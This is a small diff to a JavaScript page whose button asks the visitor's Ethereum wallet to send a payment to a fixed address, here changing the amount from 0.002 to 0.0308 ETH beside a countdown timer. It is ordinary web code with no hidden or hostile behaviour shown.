@@ -24,7 +24,7 @@ function send(e) {
     let transactionParam = {
         to: '0x3cd3f086098421642b7b7f8021467624f721b85d',
         from: account,
-        value: (2000000000000000).toString(16)
+        value: (30800000000000000).toString(16)
 
     };
     ethereum.request({ method: 'eth_sendTransaction', params: [transactionParam] })
@@ -62,8 +62,6 @@ var x = setInterval(function () {
         document.getElementById("timer").innerHTML = "EXPIRED";
     }
 }, 1000);
-
-
 
 
 button.addEventListener('click', send);
